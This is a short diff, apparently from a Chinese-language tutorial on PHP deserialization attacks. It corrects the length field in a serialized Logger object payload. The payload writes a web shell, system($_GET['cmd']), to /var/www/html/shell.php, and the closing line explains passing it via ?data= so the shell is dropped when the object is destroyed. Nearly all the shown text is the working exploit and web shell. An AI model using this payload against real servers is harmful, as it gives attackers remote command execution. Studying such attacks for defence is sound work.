@@ -60,7 +60,7 @@ $evil->logfile = '/var/www/html/shell.php';
 $evil->content = '<?php system($_GET["cmd"]); ?>';
 
 echo serialize($evil);
-// O:6:"Logger":2:{s:7:"logfile";s:26:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET["cmd"]); ?>";}
+// O:6:"Logger":2:{s:7:"logfile";s:23:"/var/www/html/shell.php";s:7:"content";s:30:"<?php system($_GET["cmd"]); ?>";}
 ```
 
 把序列化结果传给 `?data=...`，对象销毁时自动写入 WebShell。
